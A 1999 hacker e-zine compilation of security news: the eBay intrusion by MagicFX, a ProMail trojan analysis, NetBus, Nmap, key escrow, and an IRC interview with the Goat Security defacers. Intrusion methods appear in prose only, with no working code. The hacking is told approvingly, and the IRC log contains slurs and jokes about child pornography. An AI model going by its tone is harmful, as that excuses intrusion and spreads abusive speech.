         We pray for children whose nightmares come in
         the daytime, children who will eat anything, who
         have never seen a dentist, who aren't spoiled by
         anybody, children who go to bed hungry and cry
         themselves to sleep. who live and move but have
         no being.
         We pray for children who want to be carried, and 
         for those who must be. For those who never get a
         second chance. We pray for those children who
         will grab the hand of anybody kind enough to offer
         it. For these children we pray.

      MagicFX cracks eBay 

      contributed by Code Kid 
      According to MagicFX eBay has been owned for quite
      some time. To prove this on March 13th he replaced the
      main web page on one of the servers for a journalist to
      confirm. The article goes into detail on just how badly
      eBay is owned.

      Going once, going twice ... HACKED! 

      By Adam L. Penenberg 

      EBay(nasdaq: EBAY), the hot one-to-one
      auction site, was hacked on Saturday March 13
      by a 22-year old college student who goes by
      the handle MagicFX. But the story doesn't end
      there. The hacker maintains access to the site and
      can return at will. He has "root" access to eBay's
      computers, the same kind the legitimate
      administrators enjoy. This means he could change
      prices or place fake ads, divert traffic to other sites
      or even take down the entire network. 

      This was starkly illustrated to this reporter on
      Wednesday night, when the hacker, to prove his
      point, took down eBay's home page for two minutes
      and replaced it with the message: 

      Proof by MagicFX that you can't always trust
      people… not even huge companies. (who woulda
      known that?) 

      "It's 9:30 PM . . . do you know who has YOUR credit
      card information?" 

      Although eBay customers don't use credit cards to
      pay for merchandise--the site acts as a
      middleman--sellers use them to pay the company
      service fees. When contacted, the company refused
      to comment, saying that unnamed law enforcement
      officials had requested that eBay remain silent about
      issues surrounding hacking. 

      Initially, the hacker, who would not divulge his real
      name, gained access to eBay's computers on
      Saturday afternoon by figuring out what accounts
      existed, then trying simple passwords. Since eBay is
      an e-commerce site, MagicFX tried words like
      "commerce," "trading" and "eBay," until he cracked
      one, although he would not divulge the password he
      used. He says he was surprised eBay's technicians
      didn't use standard password protecting schemes,
      which would have meant a mixture of numbers and
      letters. 

      Once inside, MagicFX employed a technique referred
      to as a "local root buffer overflow." He ran a script
      that transmits too much information into a targeted
      zone. The data that can't fit is then manipulated so
      that he was able to trick the computer into running
      his commands at an elevated privilege. 

      "I exploited a buffer overflow condition, which
      existed in an SUID root program," says the hacker,
      who is finishing up a B.S. in computer science. "Then
      I used software which I had written myself to get to
      the rest of the network. FreeBSD was the first
      machine I accessed, the rest were Solaris." 

      From there, MagicFX modified the system's software
      so that instead of providing administrators with a
      secure way to work from a remote machine, it
      logged that information to a hidden file, so that not
      only could he intercept passwords and log in names,
      but actually watch everyone's keystrokes. 

      "After gaining access to more of the network, I tried
      to figure out how the service worked. Most of the
      web servers run on Windows machines, which use
      the SMB protocol to load a template page off a
      specified machine and dynamically create the
      HTML." 

      For Saturday's hack, MagicFX left his page up for
      about 45 minutes; he claims it was viewed by about
      4,000 site visitors. (Hackers often attack on
      weekend evenings, because most system
      administrators are out of the office.) The reason
      more people didn't witness the hack is that eBay
      deploys several web servers and balances the load
      based on the amount of traffic. Since MagicFX
      exploited only one machine for the web page hack,
      only users served by that machine could view the
      hacked page. 

      But he claims the company must know about the
      hack, since he monitored E-mails from users alerting
      the company. He pulled his own page down and
      logged off when he spotted a system
      administrator--"to be nice." 

      Mirrors--or copies--of both Saturday's and
      Wednesday's hacked eBay pages have been
      archived by Brian Martin, a computer security
      consultant, on his site attrition.org
      (http://www.attrition.org/mirror/attrition/ebay.com) 

      What does MagicFX say about eBay's security? "I
      think they have better security than NASA, but
      that's not saying much." 

      Martin, who also witnessed the Wednesday night
      eBay hack, says, "Large systems like eBay are
      focused on keeping the money machine running
      smoothly, but this has come at the expense of
      security. Users should realize that just because a
      site says their personal information and credit card
      numbers are secure doesn't necessarily make it so." 

      MagicFX says he hacked eBay, which has a market
      cap of more than $18 billion, because he wanted to
      see how a large e-commerce site worked from the
      inside. Once there, he discovered an added bonus:
      eBay uses a proprietary system to do its trading, he
      says, and the source code is highly prized in the
      hacker world. As a result, a number of hackers have
      approached him for a copy, but he has not
      complied,, since he hasn't had a chance to sift
      through it yet. 

      This was not the first hack for MagicFX. Recently he
      also defaced web sites promoting the movies Varsity
      Blues and 200 Cigarettes, "because they got a lot of
      hits and I didn't like the movies really." He also hit
      monicalewinsky.com because it is "anti-Clinton" and
      "ourfirsttime," a site that claimed it would webcast a
      man and woman losing their virginity. MagicFX says
      he hacked the site to get the word out it was a
      media hoax. 

      "I have learned at least as much by hacking as I
      have in school," he says.

 18.0  Aussies to ban Net pr0n
       ~~~~~~~~~~~~~~~~~~~~~~~~
       
       From The Australian
       http://technology.news.com.au/techno/4317712.htm
       
       Alston's regime to ban Net nasties
       By WAYNE ADAMS and DAN TEBBUTT
 
       20mar99
     
       COMMUNICATIONS and Information Technology Minister Richard Alston
       has unveiled a regime that will effectively ban X-rated and Refused
       Classification material from the Internet. 
     
       "There's no doubt the Internet provides enormous educational and
       informational opportunities but, at the same time, it does pose
       considerable risks for the community," he said yesterday. 
     
       "We are therefore proposing to introduce a new regime that will
       hopefully ensure, certainly for Internet sites hosted within Australia,
       that we block access to material that is either illegal, Refused
       Classification or X-rated and, in relation to R-rated material, is only
       available to those over 18 years of age." 
     
       The Australian Broadcasting Authority will oversee the regime. 
     
       Community and Internet industry groups will be included under the
       proposals. They will provide a "hotline" on offensive material and pass
       information to the ABA, monitor online sites, advise on complaints
       mechanisms and provide community education. 
     
       If the ABA thinks content is serious enough, it will be able to prevent
       access to the material pending a National Classification Board opinion. 
     
       The authority will have to issue a notice to a service provider to halt
       access to any content deemed to be proscribed content. 
     
       Senator Alston rejected suggestions that the announcement was
       related to the Telstra sale or appeasing Independent senator and
       morals campaigner Brian Harradine. 
     
       "Senator Harradine is probably the most visible public manifestation of
       concern, but the fact is that there are many hundreds of thousands of
       people in Australia who would have the greatest concern if they
       thought that under-age children could have access to illegal or highly
       offensive material," he said. 
     
       However, Labor's communications spokesman, Stephen Smith, said
       Senator Harradine and parents "should not be duped". 
     
       "The announcement today is about Australian content, and it's a very
       small proportion of Internet content which is locally produced and
       locally put online," he said. 
     
       Kimberley Heitman, chairman of Internet advocacy group Electronic
       Frontiers Australia, said: "This is as bad as it gets – they have ignored
       everything the Internet industry has said. None of these things will
       affect end users. It will just drive content offshore."

       ProMail v1.21, an advanced freeware mail program spread through several
       worldwide distribution networks (SimTel.net, Shareware.com and others),
       is a trojan.
       Upon discovering - through LAN sniffing - that the program would attempt
       to connect to SMTP instead of POP3 when a regular mail check was performed, 
       we reverse-engineered the software.
       ALL of the personal user data, including the user's password in encrypted
       format, is sent to an account on NetAddress - a free email provider -
       as soon as a valid internet connection is detected.

       ProMail v1.21, an advanced freeware mail program for Windows 95/98, is a trojan.
       It has been spread through several worldwide distribution networks (SimTel.net, 
       Shareware.com and others) as proml121.zip.
       
       Upon discovering - through LAN sniffing - that the program would attempt to 
       connect to SMTP instead of POP3 when a regular mail check was performed, we 
       reverse-engineered the software.
       
       The executable, which appears to have been created with Borland Delphi, has been 
       packed with Petite (a shareware Win32-EXE compressor) and then "hexed" to make 
       disassembly harder.
       
       ProMail v1.21 supports multiple mailboxes; every time a new mailbox is created, 
       an "ini" file containing the users full name, passwords, email addresses, 
       servers and more is generated.
       
       Prior to doing any other action, the program performs a check for a valid 
       network connection which, if found, allows for the sending of ALL of the
       personal user data, including the user's password in encrypted format, to an 
       account on NetAddress - a free email provider.

       Subject: Re: your mail
       
       currently our members have disassembled and analyzed the whole executable.
       the only thing it appears to do as a trojan is to send the accounts data
       entered by the user: full name, organization, email address, user name,
       password (encrypted), smtp and pop3 servers, etc.
       and since promail supports multiple accounts, each newly created account
       is sent.
       the data for each account is contained in a text file which is used to
       initialize promail at run-time.  the same text file is used as body of
       the email which is sent to the author (supposedly) of the program.
       it appears that all emails are sent with same subject line: "kirio".
       
       the program also creates the file promail.pml in its directory.  it's a
       zero length file used as permanent flag to "remember" to the trojan that
       one or more accounts data could not be sent in the last session (for
       example, when accounts are created off-line, or when not followed by a
       mail check in the same session).
       
       we also managed to crack the mailbox to which accounts data is sent.
       about ~80 emails (== accounts) were found and another dozen was
       received after only ten minutes or so.
       accounts for microsoft, michigan us army, old bridge chemicals and a
       videogames company - amongst the others - were found.
       
       we have merely informed a _contact_ (not the ml) in ntbugtraq and
       several "underground" news/security sites.
       well you can contact the various *traq mailing lists if you want.  we
       don't care if people still trust anything that can be downloaded from
       the net anyway.  i guess we're not exactly "white hat" hackers :P
       
       if you need any help or further analysis on a specific part of the program
       please feel free to contact us.

 20.0  C41 - Pentagon’s cyberdefenses criticized
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
       
       Pentagon’s cyberdefenses criticized
       Report: Threats aren’t taken seriously enough by HQ, troops
       MSNBC STAFF AND WIRE REPORTS

       WASHINGTON, March 22 The military’s key communications infrastructure
       is dangerously vulnerable to attacks from cyberspace and  requires 
       urgent changes, according to a new  study ordered by Congress and 
       sponsored by the  Pentagon. One avenue the Pentagon was advised 
       to consider was a change in policy that would  allow it to counter
       -attack when a cyberattacker strikes.


       THE COMMAND, Control, Communications, Computers and Intelligence
       systems - known as C4I - is compromised by security problems and also by
       a military culture prone to treating such problems as a lesser priority, 
       a National Research Council committee reported."The rate at which 
       information systems are being relied on outstrips the rate at which they
       are being protected," it said. "The time needed to develop and deploy 
       effective defenses in cyberspace is much longer than the time required 
       to develop and mount an attack."
       
         It also suggested the Pentagon consider whether "counter-attack is 
       an appropriate response to a cyber attack." As U.S. policy now stands,
       the Pentagon may not go after cyber attackers, instead handing off
       investigations to civilian law enforcement agencies.
       
         Despite evidence of security lapses in C4I - which handles 
       communications and warning tasks along the chain of command - the 
       Pentagon's  "words regarding the importance of information systems 
       security have not been matched by comparable action," the report said.
       
       
       MANAGEMENT CRITICIZED
                    
        "Troops in the field did not appear to take the protection of their C4I 
       systems nearly as seriously as they do other aspects of defense," said
       the report, which Congress ordered the Pentagon to commission in 1995.
       The council is an independent organization chartered by Congress to advise
       the government.
       
        The committee said it observed one military field exercise in  which 
       personnel in an operations center mistakenly took as a joke a cyber
       attack on their systems.
       
                    The report indicated the problems were due more to the Pentagon
       's management of the systems than to the technology itself. It cited C4I
       workers' lack of stature compared with traditional combat forces,
       compatibility problems between the services and a need for more budget
       flexibility on the matter from both the Defense Department and Congress.
       
       
       PENTAGON'S RESPONSE
       
                    In a statement, the Pentagon acknowledged that the military's
       strength "is our information technology," and that "our dependence on such
       assets, which may be subject to malicious attack, makes information
       technology our weakness as well."
                    It said that as the council's report was being prepared, the
       Defense Department had already improved protection against computer attack
       by implementing new programs, establishing a joint task force for computer
       defense and expanding training of its information technology personnel.
                    But Kenneth Allard, an analyst who has written about C4I, said
       its weaknesses are in part the fault of "Industrial Age" military
       acquisition policies - applying to computers as well as tanks, ships and
       aircraft - that give the services their own procurement duties.
                    Ships and tanks may perform different tasks, he said, but the
       Army, Navy and other services need a single-standard computer system.
                    "Twenty-first century combat is the war of the databases, in
       which information flows must go from the foxhole to the White House and back
       down again," said Allard, a former Army colonel and analyst at the Center
       for Strategic and International Studies who had not yet read the council's
       report.
       
       
       RECOMMENDATIONS
       
         The report recommended:making C4I a greater budget priority in defense 
       spending, with a flexibility that can "exploit unanticipated advances in
       C4I technology." Designating an organization responsible for providing 
       direct  defensive operational support to commanders.
              
           o  Funding a program to conduct frequent, unannounced penetration
              testing of C4I systems. 
       
           o  Ensuring that programs are operable even if one part has been
              penetrated by an adversary. 
       
           o  Emphasizing the importance of information technology in the military
              leadership. 
       
           o  Establishing an Institute for Military Information Technology,
              possibly as part of an existing body.

 21.0 [ISN] NetBus 'Trojan' Splits Security Community
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
        NetBus 'Trojan' Splits Security Community
       (03/02/99, 7:46 p.m. ET)
       By Lee Kimber, Network Week
       
       
       Internet-connected networks could be left vulnerable to Trojan attacks
       because leading anti-virus software vendors have said they won't scan and
       disable a new, more powerful NetBus Trojan. 
       
       
       Remote-control programs like NetBus were dubbed Trojans because they could
       be hidden on computers by crackers. The latest version of NetBus has split
       network-security experts because its author said it was not a Trojan as it
       remained visible. 
       
       
       But crackers reportedly rewrote it to make it invisible within days of its
       launch. 
       
       
       Data Fellows and Sophos said their anti-virus products would not disable
       the recently launched remote-control Trojan NetBus 2 Pro because its
       Swedish author Carl-Fredrik Neikter was a professional who now charged $12
       for a legitimate shareware product. 
       
       
       "NetBus 2.0 Pro is not detected as it is now commercial software,"
       according to a spokesman for Data Fellows' European office in Finland.
       "NetBus 1.x up to 1.7 was detected by anti-virus scanner F-Secure but not
       NetBus 2.0" 
       
       
       Data Fellows' website reported that earlier NetBus versions were used
       frequently to steal data and delete files on people's machines. 
       
       
       NetBus lets crackers to take remote control of networked PCs, but
       publicity over its spread has been eclipsed by the Back Orifice
       remote-control Trojan written by hacker group Cult of the Dead Cow. 
       
       
       But unlike Back Orifice, NetBus can infect Windows NT machines and is more
       easily configured. And Neikter described it himself as a "remote
       administration and spy tool." 
       
       
       His promotional material also mentioned NetBus provided the ability to
       change files and registries.  Neikter could not be contacted for comment. 
       
       
       Sophos confirmed it also would not offer NetBus support. 
       
       
       "It is a commercial product and it looks extremely professionally written.
       You can use these products for lawful or unlawful purposes," said Jan
       Hruska, Sophos technical director. 
       
       
       He added Sophos products did not scan for earlier versions of NetBus but
       the company would make a scanning tool available that people could use if
       they want to. 
       
       
       But rival vendor Network Associates said it believed NetBus was aimed at
       young crackers and joined with other vendors to commit to detecting and
       removing the Trojan in Dr Solomon's and McAfee anti-virus products. 
       
       
       "We're carrying on detecting it," said the company's anti-virus consultant
       Jack Clark. 
       
       
       "We don't believe a commercial application would have a section in the
       manual that says 'have fun with your friends' and has the ability to pop
       out the CD tray on users' machines," he added. 
       
       
       And asked if Symantec would update its software to detect the Trojan,
       Symantec technical manager Kevin Street replied: "Absolutely. We've
       already got it sorted out, so why would we remove it?"

 22.0  [ISN] Cracking tools get smarter
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Forwarded From: William Knowles <erehwon@kizmiaz.dis.org>

       
       http://www.wired.com/news/print_version/technology/story/18219.html?wnpg=all
       
       
       [Wired.com] (3.3.99) With awe and alarm, security analysts have observed
       the capabilities of Nmap, a network-scanning program that crackers are now
       using to plot increasingly cunning attacks.
       "Just before Christmas, we detected a new [network] scanning pattern we'd
       never seen before," said John Green, a security expert on the "Shadow"
       intrusion-detection team at the US Navy's Naval Surface Warfare Center.
       "Other sites have seen the same activity. The problem was, no one knew
       what was causing it." 
       Green made the remarks Tuesday in an online briefing hosted by the SANS
       Institute, a nonprofit network-security research and education
       organization. The group held the briefing to alert network administrators
       of the alarming increase in the strategies of network attacks. 
       The culprit software prowling outside the doors of networks participating
       in the study is Nmap, an existing software utility used by administrators
       to analyze networks. In the hands of intruders, security analysts
       discovered, Nmap is a potent tool for sniffing out holes and network
       services that are ripe for attack. 
       
       
       The analysts didn't look for actual damage that was carried out.  Instead,
       they silently watched as various networks were scanned by untraceable Nmap
       users. 
       
       
       "The intelligence that can be garnered using Nmap is extensive," Green
       said. "Everything that the wily hacker needs to know about your system is
       there." 
       
       
       Rather than feel in the dark to penetrate network "ports" at random, Nmap
       allows intruders to perform much more precise assaults. The implications
       are a bit unnerving for the network community. The tool makes planning
       network intrusions more effective, while simultaneously bringing this
       sophistication to a wider audience of hackers. 
       
       
       "It takes a lot of the brute force out of hacking," said Green. "It allows
       [intruders] to map hosts and target systems that might be vulnerable." 
       
       
       And that should result in a higher success rate for attempted intrusions. 
       
       
       "I think we're going to see more coordinated attacks. You can slowly map
       an entire network, while not setting off your detection system,"  said
       software developer H. D. Moore, who debriefed network analysts at the
       conference. 
       But Moore is part of the solution. He authored Nlog, software that
       automatically logs activity at a network's ports and parlays it to a
       database. Weekly checks of the database enable the user to tell if someone
       is performing an Nmap analysis. 
       
       
       Nlog serves as a companion tool to Nmap. Just like intruders,
       administrators can use Nmap to detect their own network weaknesses, then
       plug the holes. 
       
       
       Prevention is the only defense, Green and Moore said. There is no other
       known way to combat an Nmap-planned network attack. 
       
       
       "Right now it's basically a suffer-along scenario," Green said. But, at
       least, Nmap lets administrators "know what the hackers know about you."

       British Defense Ministry Dismisses Hacker Report 
       (Last updated 12:21 PM ET March 3)
       
       
       LONDON (Reuters) - Britain's Defense Ministry Wednesday dismissed as "not
       true" a newspaper report that said hackers had seized control of one of
       its military communications satellites and issued blackmail threats. 
       
       
       The Sunday Business newspaper had said the intruders altered the course of
       one of Britain's four satellites used by defense planners and military
       forces around the world. 
       
       
       "There is no basis to the story whatsoever," said a Defense Ministry
       spokesman. "It's not true." 
       
       
       Security sources cited by the newspaper said the satellite's course was
       changed just over two weeks ago. The hackers then issued a blackmail
       threat, demanding money to stop interfering with the satellite. 
       
       
       A police spokesman said the story was for the Defense Ministry to
       investigate. "Military security is a matter for the Defense Ministry,"  he
       said.

 24.0  [ISN] Encryption key would lock up criminals
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       Tuesday, March 2, 1999 Published at 17:18 GMT
       Encryption key would lock up criminals
       Dr Ross Anderson: "Big business can look after itself."
       By Internet Correspondent Chris Nuttall
       
       
       Cyber-criminals would be caught if the government introduced a system
       where the keys to coded e-mail were voluntarily lodged with licensed
       authorities, according to the UK National Criminal Intelligence Service
       (NCIS). 
       
       
       NCIS was one of the groups appearing before the House of Commons on
       Tuesday. 
       
       
       "Criminals are lazy, greedy and they make mistakes," John Abbott, NCIS
       Director General told the Trade and Industry Select Committee, which is
       hearing witnesses on electronic commerce issues. 
       
       
       "We are able to capitalise on this and we anticipate that a licensing
       scheme would allow us to have some successes," said Mr Abbott. 
       
       
       Civil liberties campaign
       
       
       Civil liberties groups are campaigning against "key escrow" - the term
       used for lodging codes with a third party. They do not want it included in
       a forthcoming Electronic Commerce Bill. 
       
       
       A long-awaited consultation paper on the bill from the Department of Trade
       and Industry (DTI) is expected in the next few days. 
       
       
       Opponents argue the proposed voluntary licensing system where Trusted
       Third Parties (TTPs) would hold the keys to encrypted data being sent over
       the Internet would never be used by criminals. 
       
       
       But an NCIS spokesman, who declined to be identified, told the hearing
       that just as criminals used telephones at every level for their
       activities, so some would use the TTPs. 
       
       
       "We would prefer to have a mandatory licensing system because that would
       be more inclusive," said Mr Abbott. 
       
       
       "I do recognise that we are moving into new territory, and this would not
       be a complete answer, and if all that is on offer is a voluntary scheme
       then that is better than no scheme at all." 
       
       
       Real time access
       
       
       The Chief Investigations Officer of HM Customs & Excise, Richard Kellaway,
       told the hearing that real-time access was needed to encrypted data. Mr
       Abbott added that it was no use knowing three days afterwards where a
       consignment of drugs had been exchanged. 
       
       
       He admitted that key escrow would not solve the problem of crimes being
       committed on an international scale over the Internet. 
       
       
       "But I would urge the government to lead. Law enforcement agencies
       throughout the world are extremely concerned with developments. We
       anticipate the problem will grow over time and certainly the G8 law
       enforcement forum are constantly discussing this and looking for ways
       forward." 
       
       
       Business concerns
       
       
       Businesses, as well as civil liberties campaigners, have voiced concern at
       the possible proposals on key escrow, and the Post Office stated its
       opposition at the hearing. 
       
       
       Jerry Cope, its managing director for strategy, said there were two areas
       of concern: "If people feel this system makes them less secure then they
       will not want to use it. We need to instil confidence. 
       
       
       "Then there is the additional cost of regulation and if it is greater than
       in France or Ireland then business will go elsewhere. It is as easy to
       send e- mail from London to Manchester via Paris as it is direct from
       London to Manchester." 
       
       
       Mr Cope said there had been a lack of dialogue between business and law
       enforcement agencies and he suggested a possible compromise. Agencies
       would bear the additional costs of being able to extract information from
       TTPs and would only exercise their powers when there was a threat to
       national security. 
       
       
       The Post Office will announce later this month that it is launching a
       Trusted Third Party service called ViaCode. 
       
       
       Red flag
       
       
       The final witness of the day, a leading encryption expert, Dr Ross
       Anderson of Cambridge University, compared key escrow to the red flag that
       had to be waved in front of the first motor cars to warn people of danger. 
       
       
       A week after the requirement was removed, there was the first road traffic
       fatality. But no-one would suggest we go back to the red flag today and
       the assumption is made by the police that 99% of those on the road are
       good guys, he said. 
       
       
       He added that the police had a long way to go with computers to match
       their current knowledge of the motor car. They had often had to call in
       outsiders such as himself to help with encryption cases. 
       
       
       "There are many, many ways of attacking computer systems and inevitably
       TTPs are going to be compromised," he said. "The role of government should
       be protecting the consumer - big business can look after itself." 
       
       
       He said the best way forward in terms of legislation was the Australian
       approach that simply recognised that electronic signatures had the same
       force as manuscript signatures. 
       
       
       "Key escrow would have to be global to achieve its stated purpose, and
       there is now no prospect of this," he said in an additional written
       submission to the committee.

 25.0 [ISN] Crypto: Under lock and key
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Forwarded From: privacy <anon@juno.com>
       
       
       http://www.newscientist.com/ns/19990306/forum.html
       
       
       Under lock and key 
       By Duncan Graham-Rowe
       
       
       GOVERNMENTS hate things going on that they don't know about. Not long ago,
       many governments insisted that they should have the ability--and the
       right--to decipher all coded messages. The US government, for example,
       tried to get organisations to use its clipper chip for encryption. Only
       the government, of course, would hold the numbers, or keys, that would
       enable it to read anything encoded by the chip. Encryption looked set to
       become a major civil liberty issue.
       
       
       The subject might seem somewhat esoteric. Indeed, many people have never
       even heard of it. But whether you know it or not, you almost certainly
       depend on computer encryption already. Banks, for example, use encryption
       software to safeguard their customers' personal identification numbers, or
       PINs.
       
       
       Many other businesses, and individuals, also have good reasons for wanting
       to be sure that information such as a credit card number sent over the
       Internet is not being intercepted--or at least cannot be read if it is.
       Human rights organisations, for example, often use cryptography to relay
       sensitive information.
       
       
       People who send coded messages obviously want to use strong encryption
       software, the best available. And while there is no such thing as an
       uncrackable code, strong encryption comes pretty close. Even with the
       fastest supercomputers, it could take years to break most properly encoded
       messages.
       
       
       And this is what gets governments so worried. Strong encryption makes
       eavesdropping on other people's communications practically impossible. 
       Many governments argue that being able to decode encrypted messages is
       essential if they are to crack down on criminal activity, such as the
       distribution of child pornography on the Internet.
       
       
       As a result, a number of Western governments, including France, Britain
       and the US, have spent years quietly trying to introduce various versions
       of what is called key escrow. The idea is that government approved
       agencies, called "trusted third parties", would be set up to hold the
       encryption keys on our behalf. Then, when the police want to decode a
       particular message or set of communications, they would present a warrant
       to these agencies. 
       
       
       It sounds reasonable, but such a system would be open to abuse and far
       from secure. Besides favouring encryption systems that are easy to crack,
       key escrow represents a weak link in what would otherwise be an almost
       impenetrable chain.
       
       
       Worse still, it wouldn't even achieve what it was designed for. If key
       escrow was in place, few criminals would be stupid enough to use it. In
       fact, criminals would probably be the only ones with any real privacy. 
       And while all those whose job it is to fight crime argue that this would
       nevertheless provide a good way of flushing out criminals, to do this
       effectively you would have to know where to look in the first place, which
       is a somewhat circular argument.
       
       
       So is it really worth jeopardising our privacy on the off chance that the
       police might catch a few careless criminals? Not according to the French. 
       Last month, France denounced its own well-established policy of banning
       commercial encryption, after 200 companies complained to the government
       about key escrow. Prime Minister Lionel Jospin openly admitted that key
       escrow was useless in fighting crime and therefore unwarranted.
       
       
       And even the US seems to be backing down, after a spate of TV commercials
       aimed at embarrassing the government brought the issue out in the open. 
       It also seems likely that export laws will be relaxed so that strong
       encryption software such as Pretty Good Privacy (PGP) is no longer
       classified as munitions and banned from export. 
       
       
       Britain's Department of Trade and Industry seems to be following suit. 
       After nearly five years of consultation, the e-commerce bill is rumoured
       to be published this week. Although the official line has been that the
       government favours key escrow, euphemistically calling it a voluntary
       system of cryptography, the message that this is unacceptable appears to
       have been drummed home not just by industry bodies but also, according to
       popular rumour, by the former trade minister Peter Mandelson.
       
       
       This is a welcome change of heart. It is just a pity that it has come not
       from governments recognising the futility of key escrow or from listening
       to the cogent arguments of civil libertarians, but merely in response to
       pressure from industry.

 26.0  HRC's interview with Goat Security (IRC LOG)  
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        
       HRC is a new site (Hackers Resource Centre) that has premiered with the
       following "article" on Goat Security, the team that recently hacked Yahoo..
       
       well a new group is out. its title: Goat Security. they are on #feed-the-goats 
       on efnet. you may visit their page at goat.sphix.com. responsible for the 
       Yahoo.com hack which is archived at hackernews.com this group is goin big and
       gettins some fame. They poke fun of Ez00ns, and B0rt. claiming they are 
       interviewing them, and talking bout how they have anal sex among other queer 
       things. and yes im even mentioned in the interviews. portrayed as a pedophiliac,
       and a homosexual. i do find this page extremely funny. it makes me laugh out 
       loud!. the group consists of members from HcV, and Legion2000. theres a few
       others that dont belong to a group. the complete roster is on their homepage.
       for the full interview direct your attention here.(see below)  on march 18th 
       they also got des-con-systems.com as far as i know there isnt a archive of 
       this hack. ech0 owned them again on March 21st. with mad elite props to goat
       security. well i wonder how long this group will go on.

       * Logging #goating to '#goating_990321.log'
       [Debris] one min
       [^Dreamer] k
       ööö [join(#goating)] chemmy (lamur@modemcable207.162.mmtl.videotron.net)
       ööö [mode(#goating)] Debris (+o chemmy)
       [chemmy] Dont you hate when you overwrite a window
       [Debris] lol
       [Debris] hold on
       [^Dreamer] k
       [Debris] Ok lets get started
       [^Dreamer] k
       [chemmy] I cant figure out MY FUCKING ERROR
       [Debris] chem
       [Debris] this is an interview
       [^Dreamer] 1) why was feed-the-goats founded? to annoy ppl? to inform ppl of ez00s?
       [^Dreamer] ez00ns rather
       [chemmy] Ha
       [chemmy] ^Dreamer, Because Debris had no life..
       [Debris] Well basically me and ech0 started it in one boring day
       [Debris] hold on more coming
       [Debris] we were talking and ech0 told me how he sometimes makes a chan called #feed-the-goats
       [Debris] so, me and ech0 went there and asked chem if we could use one of his eggdrops and of course he said no at first
       [Debris] but then he changed his mind
       [^Dreamer] whyd you change your mind chem?
       [Debris] And ech0 got hcv people coming and stuff, and i thought if i turn this into a group i can be cool so here we are
       [chemmy] Cuz debby was my friend :>
       [Debris] =]
       [chemmy] And I mean I had lotsa so why not put one in a gay unpopular friend
       [chemmy] friend-chan
       [^Dreamer] ok so then the groups as most ppl know naturally hate/dislike/whatever ez00ns and b0rt and myself. so the group just kinda turned to pokin fun and
       makin fake interviews
       [^Dreamer] ?
       [Debris] me and ech0 seem to dislike everyone but ourselves and our friends
       [Debris] And we enjoy pissing off the world
       [Debris] and
       [Debris] well we think LoU is gay, and ez00ns is too
       [Debris] so why not tell everyone else
       [^Dreamer] understandable
       [chemmy] hehe
       [Debris] were just letting out our creative genius
       [^Dreamer] who drew the damn goat pics on the intro to the goat page?
       [Debris] um
       [Debris] heh
       [Debris] uh, we um..... found thaty
       [^Dreamer] i like em
       [Debris] actually it was me
       [^Dreamer] do you have plans of like world domination? cyber wars? killing anything? or just having some fun?
       [^Dreamer] i know this interview sucks dick, but youll have to forgive me for ive never interviewed anyone before
       [chemmy] What is this interview for?
       [Debris] Well our plans at this time are, to dominate the blowing up of toilets scene, and take out the cDc forever!
       [^Dreamer] so you hate the cDc (Cult of the Dead Cow???)
       [Debris] yes
       [Debris] they always ban me, all i wanted was some damn JUAREZ
       [^Dreamer] well i started a page called H.R.C. (solarz.net/hrc) and i plan on putting this up there as my first article..
       [chemmy] ha ok
       [^Dreamer] was FtG responsible for the yahoo hack?
       [Debris] whos ftg?
       [chemmy] Just remember, Debris is crazy
       [chemmy] Ftg?
       [^Dreamer] Feed-the-Goats
       [Debris] We are goat security
       [^Dreamer] ok goat security (Gs ok?)
       [chemmy] So therefore yes
       [Debris] Yes, the yahoo hack, although denied by yahoo, did take place and was committed by members of Goat
       [^Dreamer] why did you target yahoo? any specific reason [chemmy] yahoo is gay
       [chemmy] I hate the name
       [Debris] like the altered index.htm said, We were looking for porn and found pictures of billy boy
       [^Dreamer] gotcha, well if ya ever want porn ive got mad pics (and no theres no child porn )
       [Debris] well we only want child porn
       [Debris] and for the record, EHAP can suck my underaged cock
       [chemmy] and gr0wn grand pa's.
       [Debris] sorry RS...
       [^Dreamer] anyone else youd like to send your deepest regards too? just what groups/ppl do u like?
       [Debris] yes
       [^Dreamer] i understand that you hate dalnet, is this true and y?
       [^Dreamer] am gettin ahead of myself
       [Debris] I dont hate dalnet but i never go on it
       [chemmy] I am in X-Forces so therefore I LIKE ALL MY FRIEEEEEEENDS!
       [^Dreamer] does x-forces have a homepage?
       [Debris] ya, werd to #freaks, m1les, X-forces, Script kiddies inc (which im in and some texts i wrote are there) and #webfringe
       [chemmy] x-forces.com but it sucks
       [^Dreamer] alright.
       [chemmy] We're actually doing a new design (BTW it sucked cuz I wanna implicated it in =) )
       [Debris] some stuff i wrote is at www.nuclearbomb.com/ski
       [chemmy] And the x-forces serv hosts goat's page
       [chemmy] So if debris tries anals attempts on me
       [chemmy] It drops
       [^Dreamer] haha
       [^Dreamer] you guys are just too crazy
       [Debris] shutup you stupid seperatist
       [chemmy] DIE CANADA DIE
       [chemmy] Yes
       [Debris] DIE FRENCH WHORE
       [^Dreamer] anything youd like to end in closing?
       [chemmy] Yes
       [Debris] yes
       [^Dreamer] shoot
       [chemmy] WE WILL OWN THE UNIVERSE@&*^#@
       [Debris] my turn
       [chemmy] I plan on dominating the world
       [Debris] IL MAY BE GOING TO JAIL TOMORROW SO...... FREE I-L, FREE GOAT!
       [^Dreamer] goin to jail for?
       [Debris] assault
       [^Dreamer] o one more thing
       [Debris] what
       [^Dreamer] what was the url of that site that goat security owned tongiht?
       [Debris] that wasnt goat
       [Debris] that was opt1k
       [chemmy] des-con-systems.com
       [chemmy] Ya
       [Debris] opt1k aint no goat
       [^Dreamer] yes. what was that site origianlly?
       [Debris] goat owned that site first
       [Debris] 3 days ago
       [^Dreamer] and y did ya target it?
       [chemmy] Ask opt1k
       [Debris] because it was easy, and our premade scripts supported irt
       [chemmy] And note that tomorrow or day after me & ech0 release a nice prog
       [^Dreamer] where can we get the prog?
       [Debris] no its not
       [Debris] itsa gay prog, your making so ken will hump you
       [chemmy] We'll release it to friends first then public if any site wants it :>
       [chemmy] No deb you jealous you fuck!
       [chemmy] I'm gonna haxor you with it
